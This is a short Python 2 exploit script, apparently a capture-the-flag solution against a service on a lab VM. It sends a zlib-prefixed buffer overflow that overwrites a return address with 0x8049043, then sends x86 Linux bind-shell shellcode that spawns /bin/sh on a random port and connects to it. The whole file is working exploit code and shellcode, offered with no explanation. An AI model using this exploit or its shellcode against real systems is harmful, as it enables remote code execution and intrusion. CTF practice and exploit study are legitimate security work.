__author__ = 'clu'

import zlib
import struct
import sys

sys.path.append('../../../tools')

import ctf
import random

HOST = '192.168.56.101'
PORT = 49681

shell_port = random.randint(1111,65536)

bind_shellcode = (
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66"
"\xb3\x01\x51\x6a\x06\x6a\x01\x6a\x02\x89"
"\xe1\xcd\x80\x89\xc6\xb0\x66\xb3\x02\x52"
"\x66\x68"+ struct.pack('>H', shell_port) + "\x66\x53\x89\xe1\x6a\x10"
"\x51\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x04"
"\x6a\x01\x56\x89\xe1\xcd\x80\xb0\x66\xb3"
"\x05\x52\x52\x56\x89\xe1\xcd\x80\x89\xc3"
"\x31\xc9\xb1\x03\xfe\xc9\xb0\x3f\xcd\x80"
"\x75\xf8\x31\xc0\x52\x68\x6e\x2f\x73\x68"
"\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89"
"\xe1\x52\x89\xe2\xb0\x0b\xcd\x80"
)

def main():
    s = ctf.connect(HOST,PORT)

    zlib_data = zlib.compress('')
    payload_len = len(zlib_data) + len(bind_shellcode) + 4 + 5

    ctf.send(s, struct.pack('I', payload_len))

    ctf.send(s,zlib_data)
    ctf.send(s, 'A' * (0xD-len(zlib_data)))
    ctf.send(s, struct.pack('I',0x8049043))
    ctf.send(s, bind_shellcode)
    
    ctf.shell(HOST, shell_port)

if __name__ == '__main__':
    main()
